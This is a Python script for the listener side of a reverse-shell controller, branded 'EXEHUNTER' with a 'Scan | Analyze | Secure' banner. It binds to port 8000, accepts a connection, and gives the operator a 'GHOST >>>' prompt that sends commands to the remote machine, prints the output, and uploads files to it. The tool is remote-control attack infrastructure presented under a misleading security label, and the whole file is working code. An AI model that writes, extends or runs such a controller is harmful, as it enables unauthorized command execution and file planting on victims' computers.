import socket 
import pyfiglet
from colorama import Fore, Style, init
import os
import time
init(autoreset=True)

def show_banner():
    # Create ASCII art
    banner = pyfiglet.figlet_format("EXEHUNTER", font="slant")

    # Print with color
    print(Fore.RED + banner)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.GREEN + "        Welcome to EXEHUNTER Tool")
    print(Fore.CYAN + "        Scan | Analyze | Secure")
    print(Fore.YELLOW + "=" * 70)

show_banner()
try:

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    HOST = "0.0.0.0"
    PORT = 8000

    s.bind((HOST, PORT))

    print("Looking For Connections")

    s.listen(1)
    conn, addr = s.accept()

    print(f"Connected With {addr}")

except Exception as e:
    print(f"Some Problem occurred {e}")


while True:
    try:
        cmd = input("GHOST >>> ")
        if not cmd:
            continue

        elif cmd == "exit":
            conn.send(cmd.encode())
            print("Connection Disconnected")
            break
        elif cmd == "clear":
            os.system("cls")
            os.system("clear")

        elif cmd == "banner":
            show_banner()
        
        elif cmd.startswith("upload "):
            try:
                filename = cmd.replace("upload", "").strip()

                with open(filename, "rb") as f:
                    data = f.read()

        
                    conn.send(filename.encode())
                    time.sleep(0.5)

        
                    conn.send(str(len(data)).encode())
                    time.sleep(0.5)

        # send actual file
                    conn.sendall(data)

                    print("File Sent Successfully")

            except Exception as e:
                print("Error:", e)
        else:
            print("task Completed")
            conn.send(cmd.encode())
            sysmsg = conn.recv(5000).decode()
            print(sysmsg)


    except Exception as f:
        print(f"Connection Error : {f}")
        continue
